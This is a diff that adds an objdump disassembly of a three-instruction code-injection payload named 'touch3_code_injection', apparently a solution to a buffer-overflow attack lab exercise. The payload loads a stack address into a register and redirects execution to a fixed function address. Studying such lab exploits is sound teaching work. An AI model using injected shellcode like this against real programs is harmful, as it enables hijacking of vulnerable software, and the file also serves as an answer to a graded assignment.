@@ -1,0 +1,10 @@
+
+touch3_code_injection.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	bf 78 2c 67 55       	mov    $0x55672c78,%edi
+   5:	c7 04 24 98 1a 40 00 	movl   $0x401a98,(%rsp)
+   c:	c3                   	retq   
